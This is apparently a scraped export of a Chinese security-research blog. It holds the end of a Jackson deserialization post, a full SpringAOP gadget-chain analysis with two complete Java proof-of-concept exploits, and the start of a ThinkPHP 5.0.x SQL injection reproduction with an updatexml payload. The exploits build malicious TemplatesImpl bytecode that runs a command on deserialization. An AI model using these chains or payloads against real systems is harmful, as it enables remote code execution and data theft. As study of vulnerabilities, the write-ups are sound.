setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static Object getFieldValue(Object obj, String fieldName) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); return field.get(obj); } catch (Exception e) { clazz = clazz.getSuperclass(); } } return null; } } 就可以在反序列化时弹出计算机了。一个非常好的获取到父类的变量并进行修改或者设置值的代码设计，多学习。\n——————\n参考文章：\nhttps://www.cnblogs.com/gaorenyusi/p/18411269\nhttps://xz.aliyun.com/news/14924?time__1311=eqUxuDBD0AGQBD7qGNcjDA2A%2BAqY5mKfxx\u0026u_atoken=634642368fa712ac87bbdc71d6c17d07\u0026u_asig=0a472f9217430687398891321e0048\nhttps://xz.aliyun.com/news/14169?u_atoken=cc132e497818eb0c240edb80bb120546\u0026u_asig=0a472f9217430687458091642e0048\nhttps://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/\n","date":"2025-04-07T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E9%93%BE/","title":"jackson反序列化通杀链"},{"content":"SpringAOP链 SpringAOP，我们在学习rome链时就利用到了这个依赖的HotSwappableTargetSource类，从而可以调用到任意类的equals()方法并控制传递参数。\n但是最近爆出来了一条SpringAOP链，可以调用任意类的无参方法，但是应该必须要public才行，并且这条链子只依赖SpringAOP和aspectjweaver两个依赖包，而springboot中的spring-boot-starter-aop自带包含这俩类，所以其实可以认为在任何springboot里都能打（但是我没找到jdk8下的符合的版本，所以还是用的分开的版本），所以这里使用的依赖项如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;!-- \u0026amp;lt;!\u0026amp;ndash; https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-aop \u0026amp;ndash;\u0026amp;gt;--\u0026gt; \u0026lt;!-- \u0026lt;dependency\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;artifactId\u0026gt;spring-boot-starter-aop\u0026lt;/artifactId\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;version\u0026gt;3.4.4\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;!-- \u0026lt;/dependency\u0026gt;--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-aop\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.3.19\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.aspectj\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;aspectjweaver\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.9.8\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 测试环境：\nJdk8u71 注意我最开始是用的高版本的，后来才改成低版本，自己区分，但是过程以及代码都是差不多的，也就是说，这条链子在\u0026lt;=jdk17应该也能用，因为jdk17也能调用反射。\n调试分析 这里的sink点存在于org.springframework.aop.aspectj.AbstractAspectJAdvice类的invokeAdviceMethodWithGivenArgs()方法： 这里的this.aspectJAdviceMethod就是一个可控的变量，然后这里的ReflectionUtils.makeAccessible()方法就是判断是否为public，不是的话就会调用setAccessible(true)来设置成可访问： 再回到原来的invokeAdviceMethodWithGivenArgs()方法，后续的重点变量就是aspectInstanceFactory，这个变量调用的getAspectInstance()方法返回值决定了相对应的方法调用的实例，这个变量的类型是AspectInstanceFactory，这是一个接口类，可以看一下它的实现类的getAspectInstance()方法的返回值是否可以利用，同时需要这个类是实现了Serializable接口，这样才可以在序列化时利用。\n这里自己找了一下，感觉可以尝试利用LazySingletonAspectInstanceFactoryDecorator类的getAspectInstance()方法： 这里涉及到的materialized变量可以通过反射来修改，并且也是实现了Serializable接口，但是在对其他变量的定义还需要找一个类来赋值：\n不好利用，再看看其他类，可以发现一个非常好用的类：SingletonAspectInstanceFactory。位于org.springframework.aop.aspectj.SingletonAspectInstanceFactory，关键代码如下：\n非常符合利用条件，可控的参数，可以赋值为任意类，由此可达到方法调用的对应实例的任意赋值。\n回到AbstractAspectJAdvice类，有几个点需要说明：\n这是一个抽象类，所以无法直接实例化利用 这个类定义了readObejct()方法，在实例化时要保证赋值正确，同时调用的是getMethod()方法，应该只能获取public类型的方法吧： 后续构造时注意一下这里提到的点。\n——————\n继续来看链子，现在就是看可以会调用到AbstractAspectJAdvice类的invokeAdviceMethodWithGivenArgs()方法，同时还可以看哪里会调用到AbstractAspectJAdvice类的invokeAdviceMethod()方法： 从首发的文章的链子来看，这里找到可触发点在AspectJAroundAdvice类的invoke()方法：\n看这个类，可以发现这个类的父类是AbstractAspectJAdvice，是public方法： 再看这个类的invoke()方法，可以看到是实现了调用invokeAdviceMethod()方法，所以这里可以尝试接入前面分析的后续链子，从而达到调用任意类的方法。\n再继续往前找，现在就是想怎么可以触发到这个类的invoke()方法，第一步想到的肯定是通过动态代理来打，但是这个参数传递有点问题，似乎是不能直接打的。那么在看如何调用到这个类的invoke()方法，这里往前找到的方法为ReflectiveMethodInvocation类的proceed()方法：\n在方法最后调用了interceptorOrInterceptionAdvice类的invoke()方法，从类的调用来看，可以知道MethodInterceptor类是一个接口类，所以需要interceptorOrInterceptionAdvice实现了MethodInterceptor接口，再看我们想要利用的AspectJAroundAdvice类，可以发现这个类是实现了MethodInterceptor接口的，刚好可以直接利用。现在就是看怎么将我们想要利用的类放进去了，主要的代码逻辑在于：\n1 2 Object interceptorOrInterceptionAdvice = this.interceptorsAndDynamicMethodMatchers.get(++this.currentInterceptorIndex); 这里涉及到的两个变量：interceptorsAndDynamicMethodMatchers和currentInterceptorIndex，第一个是list类型，第二个是int类型，并且默认是-1，而第一个变量可以在类初始化时进行赋值，当然，我们还可以通过反射来修改两个变量的值。\n那么现在就是看怎么调用这个类的proceed()方法了，需要注意的是，ReflectiveMethodInvocation类没有实现Serializable接口，所以需要找特别的方法来进行调用，在参考文章中学到一个非常好用且经典的解决方法：既然我们无法在反序列化过程中使用，那么就只能依赖于动态创建。\n同时需要注意的是，既然都是在反序列化过程中动态创建了，那么是肯定无法通过反射来修改类变量的了。那么现在来认真看一下代码实现逻辑的条件：\n其实只要interceptorsAndDynamicMethodMatchers的list中有我们想要放进去的AspectJAroundAdvice类实例即可。原因如下：\nAspectJAroundAdvice类本身以及父类都没有实现InterceptorAndDynamicMethodMatcher类，所以是肯定可以进入到else语句进行预期的invoke()方法调用 其次只要size()返回的值不为0，也就是至少有一个值就行了，那么这样返回的size-1就不会与-1相同，同时在调用get()获取值时，是++this.currentInterceptorIndex，也就是先+1然后再获取值，这里也就回从-1变成0，从而获取到list中的第一个值。 综上，我们只要在动态创建ReflectiveMethodInvocation类时能控制构造函数的最后一个参数即可：\n继续往上找到的JdkDynamicAopProxy类，这个类有动态创建ReflectiveMethodInvocation的地方： 可以看到在JdkDynamicAopProxy类中有调用，这个类在解决jackson不稳定性的链子也是了解过的，需要反射来创建类实例，跟进相对应的方法：\n发现存在于这个类的invoke()方法中，代码调用过程如上，所以我们这里就是需要控制这个list类型的chain中放有一个AspectJAroundAdvice类实例。\n再看JdkDynamicAopProxy类，这个类是实现了Serializable接口的，所以可以用来序列化，并且这个类的invoke()的参数接收是和基本的动态代理的点是一样的，所以这里可以尝试利用动态代理来进行触发JdkDynamicAopProxy类的invoke()方法。\n现在来关注参数传递，怎么控制这个chain变量，主要是如下几个变量需要控制：\n看了一下，这里的advised变量要求必须是AdvisedSupport类型，这个类是public，并且这个类的父类是实现了Serializable接口的，可以直接利用。\n然后这里的targetSource也可以控制，变量赋值情况如下： 直接就是获取这个变量，然后想要控制target的话，还需要注意这个targetSource变量所对应的对象是否有getTarget()方法，跟进这个变量的赋值，变量定义为TargetSource类型，这是一个接口类，所以需要找它的实现类来利用，自己简单找了一下，至少有两个类可以利用：\n一个是AdvisedSupport本类的setTarget()方法： 这里实例化了一个SingletonTargetSource类，跟进情况如下：\n都是object类型，并且方法对应，可以利用。\n另外一个类是HotSwappableTargetSource类： 它的getTarget()方法：\n所以也是非常符合的。也许TargetSource接口类的实现类还有，这里不多说了。\n继续看条件：\n现在的关键就是AdvisedSupport类的getInterceptorsAndDynamicInterceptionAdvice()方法，跟进这个方法： 再看和这里有关的methodCache变量：\n一个Map类型，标注了key和value的类型，这里有一个非常关键的点，这个变量的定义为transient，导致这个变量不可被序列化。而这个类的构造方法以及readObject()方法有对这个变量的赋值：\n这个ConcurrentHashMap类其实也是一个Map类型的类，存在put()方法用于放入键值对。\n再仔细看getInterceptorsAndDynamicInterceptionAdvice()方法，由于methodCache变量声明为transient，所以只有在cached的获取肯定为null，那么来看进入if条件的代码，这里会调用advisorChainFactory变量的getInterceptorsAndDynamicInterceptionAdvice()方法，这里的advisorChainFactory变量默认为DefaultAdvisorChainFactory类实例：\n所以会调用DefaultAdvisorChainFactory类的getInterceptorsAndDynamicInterceptionAdvice()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 public List\u0026lt;Object\u0026gt; getInterceptorsAndDynamicInterceptionAdvice( Advised config, Method method, @Nullable Class\u0026lt;?\u0026gt; targetClass) { // This is somewhat tricky... We have to process introductions first, // but we need to preserve order in the ultimate list. AdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance(); Advisor[] advisors = config.getAdvisors(); List\u0026lt;Object\u0026gt; interceptorList = new ArrayList\u0026lt;\u0026gt;(advisors.length); Class\u0026lt;?\u0026gt; actualClass = (targetClass != null ? targetClass : method.getDeclaringClass()); Boolean hasIntroductions = null; for (Advisor advisor : advisors) { if (advisor instanceof PointcutAdvisor) { // Add it conditionally. PointcutAdvisor pointcutAdvisor = (PointcutAdvisor) advisor; if (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) { MethodMatcher mm = pointcutAdvisor.getPointcut().getMethodMatcher(); boolean match; if (mm instanceof IntroductionAwareMethodMatcher) { if (hasIntroductions == null) { hasIntroductions = hasMatchingIntroductions(advisors, actualClass); } match = ((IntroductionAwareMethodMatcher) mm).matches(method, actualClass, hasIntroductions); } else { match = mm.matches(method, actualClass); } if (match) { MethodInterceptor[] interceptors = registry.getInterceptors(advisor); if (mm.isRuntime()) { // Creating a new object instance in the getInterceptors() method // isn\u0026#39;t a problem as we normally cache created chains. for (MethodInterceptor interceptor : interceptors) { interceptorList.add(new InterceptorAndDynamicMethodMatcher(interceptor, mm)); } } else { interceptorList.addAll(Arrays.asList(interceptors)); } } } } else if (advisor instanceof IntroductionAdvisor) { IntroductionAdvisor ia = (IntroductionAdvisor) advisor; if (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) { Interceptor[] interceptors = registry.getInterceptors(advisor); interceptorList.addAll(Arrays.asList(interceptors)); } } else { Interceptor[] interceptors = registry.getInterceptors(advisor); interceptorList.addAll(Arrays.asList(interceptors)); } } return interceptorList; } 这里的config就是AdvisedSupport类，再看代码逻辑，最后返回的是interceptorList变量，而向这个变量中添加值的操作都是如下：\n1 2 Interceptor[] interceptors = registry.getInterceptors(advisor); interceptorList.addAll(Arrays.asList(interceptors)); 基本可以说是肯定会添加的，最后的else也是进行了这个添加的操作，可以看一下getInterceptors的判断逻辑，registry的获取：\n调用的DefaultAdvisorAdapterRegistry类的getInterceptors()方法：\n关键的就是上述方法，先看需要利用的advisor变量，是Advisor类型，是一个接口类，找了一下实现类，发现DefaultIntroductionAdvisor类是可以利用的，实现了Serializable接口，可以序列化，并且getAdvice()方法返回实例化传进去的advice变量：\n（学完后我回来看了一下，从代码层面来讲，发现DefaultIntroductionAdvisor类在DefaultAdvisorChainFactory类的getInterceptorsAndDynamicInterceptionAdvice()方法中应该是会进入到else if语句，但是想要添加也是非常好控制的：\nAdvisedSupport类中的方法定义： preFiltered变量默认为false，但是可以通过setPreFiltered()方法将其设置为true，具体就看要是下面的分析出错了再加吧。当然还可以控制第二个，反正为||，但是这样就需要看targetClass的匹配情况了。\n）\n再看getInterceptors()方法后续代码，只要getAdvice()方法返回的类实现了Advice接口和MethodInterceptor接口，就可以将这个类放入list中，而我们想要利用的是我们想要传入的是AspectJAroundAdvice类实例，这个类的父类AbstractAspectJAdvice实现了Advice接口，可以直接利用。\n但是这里其实有两条链子，区别点也是在这里，另外一种方法也挺有意思的，学习一下，两条链子主要的区别就是如下：\n找一个同时实现了Advice接口和MethodInterceptor接口并且可以利用的类，也就是前面分析的。 第二个就是再加一层代理，这里也就是再次利用JdkDynamicAopProxy，通过JdkDynamicAopProxy来同时代理Advice和MethodInterceptor接口，并设置反射调用对象（target）是AspectJAroundAdvice，从而可以在调用到MethodInterceptor接口对应的方法时会继续链子的执行。这个就是对JdkDynamicAopProxy类的利用了，非常强大的类呀。 所以这里其实有两条链子，下面分别再继续说一下。\nPOC构造 链子一 前面分析得基本已经非常清晰了，AspectJAroundAdvice类的父类AbstractAspectJAdvice(sink点的类)实现了advice接口，所以其实可以直接尝试利用，那么就用CC5的反序列化调用toString()方法打一个来触发代理：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import javax.management.BadAttributeValueExpException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import org.springframework.aop.aspectj.AspectJAroundAdvice; import org.springframework.aop.aspectj.SingletonAspectInstanceFactory; import org.springframework.aop.framework.AopProxy; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; import org.springframework.aop.aspectj.AspectJExpressionPointcut; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.support.DefaultIntroductionAdvisor; import javassist.*; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Method; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Method method1 = impl.getClass().getDeclaredMethod(\u0026#34;newTransformer\u0026#34;); AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); SingletonAspectInstanceFactory x1 = new SingletonAspectInstanceFactory(impl); AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(method1,pointcut,x1); DefaultIntroductionAdvisor decorator = new DefaultIntroductionAdvisor(aspectJAroundAdvice); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(impl); advisedSupport.addAdvisor(decorator); Class clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor constructor = clazz.getDeclaredConstructor(AdvisedSupport.class); constructor.setAccessible(true); //代理设置 InvocationHandler invocatinoHandler = (InvocationHandler) constructor.newInstance(advisedSupport); AopProxy proxy = (AopProxy) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{AopProxy.class},invocatinoHandler); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); setFieldValue(bad,\u0026#34;val\u0026#34;,proxy); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 运行后就直接在反序列化时弹出计算机了。\n再调试一下基本过程，有不同点： 这里为什么会有呢，不应该是会进入if条件吗？缓存问题？没调出来，搞不懂？\n而对于为什么调用无参数构造方法，可以自己去跟一下这里的过程。\n所以Gatget如下：\n1 2 3 4 5 JdkDynamicAopProxy#invoke()-\u0026gt; ReflectiveMethodInvocation#proceed()-\u0026gt; AspectJAroundAdvice#invoke()-\u0026gt; AbstractAspectJAdvice#invokeAdviceMethod()-\u0026gt; AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs() 基本和预期相同。\n链子二 这一条链子也是非常有意思的点，值得学习，具体过程上面提出来的点也非常清晰了，简单想了一下流程，感觉应该是在如下地方触发第二次JdkDynamicAopProxy的invoke()方法：\n而第二次触发invoke()方法的流程就和jackson不稳定性解决的链子流程是一样的了，这里不多说。\n简单构造如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import javax.management.BadAttributeValueExpException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import org.aopalliance.aop.Advice; import org.aopalliance.intercept.MethodInterceptor; import org.springframework.aop.aspectj.AspectJAroundAdvice; import org.springframework.aop.aspectj.SingletonAspectInstanceFactory; import org.springframework.aop.framework.AopProxy; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; import org.springframework.aop.aspectj.AspectJExpressionPointcut; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.support.DefaultIntroductionAdvisor; import javassist.*; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Method; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Method method1 = impl.getClass().getDeclaredMethod(\u0026#34;newTransformer\u0026#34;); AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut(); SingletonAspectInstanceFactory x1 = new SingletonAspectInstanceFactory(impl); AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(method1,pointcut,x1); Class clazz0 = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor constructor0 = clazz0.getDeclaredConstructor(AdvisedSupport.class); constructor0.setAccessible(true); AdvisedSupport advisedSupport0 = new AdvisedSupport(); advisedSupport0.setTarget(aspectJAroundAdvice); Advice proxy0 = (Advice) getProxy(constructor0,advisedSupport0,new Class[]{MethodInterceptor.class,Advice.class}); DefaultIntroductionAdvisor decorator = new DefaultIntroductionAdvisor(proxy0); AdvisedSupport advisedSupport1 = new AdvisedSupport(); advisedSupport1.setTarget(impl); advisedSupport1.addAdvisor(decorator); //代理设置 AopProxy proxy2 = (AopProxy) getProxy(constructor0,advisedSupport1,new Class[]{AopProxy.class}); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); setFieldValue(bad,\u0026#34;val\u0026#34;,proxy2); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } public static Object getProxy(Constructor constructor,AdvisedSupport advised,Class[] interface1) throws Exception{ InvocationHandler invocatinoHandler = (InvocationHandler) constructor.newInstance(advised); Object proxy = (Object) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),interface1,invocatinoHandler); return proxy; } } 成功在反序列化时弹出计算机。\n调试的唯一不同点就是如下：\n这里还是没有进入if语句，不知道为什么，但是后面gaoren帮我跑就能进入if语句。\n所以Gatget如下：\n1 2 3 4 5 6 7 JdkDynamicAopProxy#invoke()-\u0026gt; ReflectiveMethodInvocation#proceed()-\u0026gt; JdkDynamicAopProxy#invoke()-\u0026gt; AopUtils#invokeJoinpointUsingReflection()-\u0026gt; AspectJAroundAdvice#invoke()-\u0026gt; AbstractAspectJAdvice#invokeAdviceMethod()-\u0026gt; AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs() 总结 非常有意思的链子呀，JdkDynamicAopProxy类真的强大，只要控制得好，可以调用任意类的任意方法，主要还是看触发invoke()的方法，因为我们可控反射中的invoke()中的类实例，非常有意思。\n最后，这个springAOP链是一个非常好用的类，基本上springboot的环境都能打，可以调用任意类的无参数方法。\n参考文章： https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ\nhttps://xz.aliyun.com/news/17640\nhttps://xz.aliyun.com/news/17530\n","date":"2025-03-27T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/springaop%E9%93%BE/","title":"SpringAOP链"},{"content":"ThinkPHP漏洞复现 ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架。下面就对几个漏洞点进行学习以及复现。\n首先需要配置好xdebug环境，这里可以参考我的另一篇文章：\nhttps://fupanc-w1n.github.io/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/\nThinkphp5 SQL注入漏洞 漏洞版本：5.0.13\u0026lt;=ThinkPHP\u0026lt;=5.0.15\n——————\n环境搭建 这里再简单说说环境搭建，后面其实都大差不差的。在github上下载v5.0.15的源码，然后在小皮中搭建一个网站即可，以composer.json文件所在目录为根目录，然后配置mysql，直接使用phpstudy上的即可，但是需要往里面插入数据：\n1 2 3 create database tp_text; create table users(username varchar(20)); insert into users value (\u0026#34;fupanc\u0026#34;),(\u0026#34;test\u0026#34;); 然后修改部分源码，在composer.json中指定版本：\n还可以看到这里的php版本要求，但是我这里就直接使用的7.3.4了，然后在这个目录下使用composer install就创建好了。\n然后在application/index/controller/Index.php中添加入口点，模仿一个数据查询的部分：\n即\n1 2 $username = request()-\u0026gt;get(\u0026#39;username/a\u0026#39;); db(\u0026#39;users\u0026#39;)-\u0026gt;insert([\u0026#39;username\u0026#39;=\u0026gt;$username]); 然后修改数据库的配置文件，位于application/database.php：\n再在application/config.php开启调试：\n1 2 3 4 // 应用调试模式 \u0026#39;app_debug\u0026#39; =\u0026gt; true, // 应用Trace \u0026#39;app_trace\u0026#39; =\u0026gt; true, phpstorm的配置就是前面给的文章，参考那个来配即可，简单修改一下如人口路径：\n最后成功打上断点：\n————\n这里其实就是要传参username，可以先简单加一个参数来调试一下过程，直接如下配置就行：\n代码审计 开始审计，打通的POC如下：\n1 ?username[0]=inc\u0026amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)\u0026amp;username[2]=1 还是先从原配置的传参来，简单说明一下这里的添加的入口的代码逻辑：\n1 2 $username = request()-\u0026gt;get(\u0026#39;username/a\u0026#39;); db(\u0026#39;users\u0026#39;)-\u0026gt;insert([\u0026#39;username\u0026#39;=\u0026gt;$username]); 对于第一行代码，先是初始化了一个request对象，然后调用了get()函数，跟进这个get()函数：\n这里的get在类中的最初定义是一个空数组，然后会将$_GET（也就是get传参的内容）的值全部赋值给这个，然后会调用input()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 public function input($data = [], $name = \u0026#39;\u0026#39;, $default = null, $filter = \u0026#39;\u0026#39;) { if (false === $name) { // 获取原始数据 return $data; } $name = (string) $name; if (\u0026#39;\u0026#39; != $name) { // 解析name if (strpos($name, \u0026#39;/\u0026#39;)) { list($name, $type) = explode(\u0026#39;/\u0026#39;, $name); } else { $type = \u0026#39;s\u0026#39;; } // 按.拆分成多维数组进行判断 foreach (explode(\u0026#39;.\u0026#39;, $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; } else { // 无输入数据，返回默认值 return $default; } } if (is_object($data)) { return $data; } } // 解析过滤器 $filter = $this-\u0026gt;getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, \u0026#39;filterValue\u0026#39;], $filter); reset($data); } else { $this-\u0026gt;filterValue($data, $name, $filter); } if (isset($type) \u0026amp;\u0026amp; $data !== $default) { // 强制类型转换 $this-\u0026gt;typeCast($data, $type); } return $data; } 简单过程，从前面可以看出来就是一些分割操作，在前面参数的定义中，username/a代表的就是接收一个数组类型的username参数，简单说一下后面的分割操作：\n前面有一个用/分割，获取到了参数的type，然后这里获取到了用.来分割，其实逻辑就是获取到username的值，这里是fupanc，所以会将$data值设置成了fupanc，并且这个值不是一个实例，所以也不会进入后面的if条件。\n继续往后面看：\n这里调用了getFilter()函数，就是一个获取过滤器的操作，但是我这里并没有特别设置filter，所以就是为空。\n再后面，这里我是直接传参的fupanc，不是数组类型，所以不hi进入后面的if语句，而在else语句中，可以看到的调用了filterValue()函数：\n类的传参如上，然后调用了array_pop()函数，就是去掉数组的最后一个元素。但是后面的is_callable函数是没有通过的，is_callable()函数就是判定是否可以作为为一个函数调用，很显然这里不行。而is_scalar()函数，就是检测是否是一个标量，标量变量是指那些包含了 integer、float、string 或 boolean 的变量，而 array、object 和 resource 则不是标量。这里的is_scalar函数虽然满足了，但是后面的is_scalar函数里面定义的if等语句都是不满足的，所以最后会直接return：\n然后就会调用到filterExp()函数：\n1 2 3 4 5 6 7 8 public function filterExp(\u0026amp;$value) { // 过滤查询特殊字符 if (is_string($value) \u0026amp;\u0026amp; preg_match(\u0026#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i\u0026#39;, $value)) { $value .= \u0026#39; \u0026#39;; } // TODO 其他安全过滤 } 这里就是一个sql注入的防御机制，大小写匹配来构建waf，如果匹配到了内容，那么就会直接将value后面加一个空格，但是本地测试了一下，这个过滤得比较一般呀。\n最后调用完filterEXP和filterValue函数过后就回到了input()函数：\n最后有一个类型转换，这里得$type变量就是在前面/分割那里分割出来的。最后，经过类型转换后，这里就会将data的值变成一个数组并将其返回：\n但是如果我直接传参时就是一个数组呢？还是简单改一下配置即可：\n然后再次调试即可，不同的点在于在调用input()方法时，is_array函数判断成功：\n然后会调用到array_walk_recursive()函数，其实就是会调用filterValue()函数，简单跟了一下。过程其实也是和前面差不多的，一个检测值的操作，这里就不多说了。最后调用reset()函数来输出数组第一个值，也就是fupanc，并且后面的操作也是差不多的，这里就不多说了。\n然后就到了数据库连接及插入操作了：\n1 db(\u0026#39;users\u0026#39;)-\u0026gt;insert([\u0026#39;username\u0026#39;=\u0026gt;$username]); 